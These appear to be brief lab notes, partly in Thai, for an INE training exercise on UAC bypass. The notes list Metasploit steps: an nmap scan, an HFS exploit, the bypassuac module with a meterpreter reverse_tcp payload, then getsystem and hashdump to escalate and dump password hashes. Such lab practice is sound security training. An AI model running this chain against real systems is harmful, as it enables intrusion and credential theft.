`nmap -sC -sV demo.ine.local`

`msfconsole`
`search hfs`
`use 0`
`set RHOSTS demo.ine.local`

`whoami`
victim\admin

โจทย์ชื่อ UAC Bypass: Memory Injection คงไม่ต้องเดาอะไรมากแล้ว

`background`
keep session

`search bypassuac`
`use 0`
`set SESSION 1`
`run`

`set PAYLOAD windows/x64/meterpreter/reverse_tcp`
อย่าลืม getprivs ใช้สิทธิ

`getsystem`
`hashdump`

๊UAC เจอบ่อย มันไม่ใช่บัคด้วย !!! ถ้าเป็น  admin group แล้วไม่มีสิทธิ ยกได้เสมอ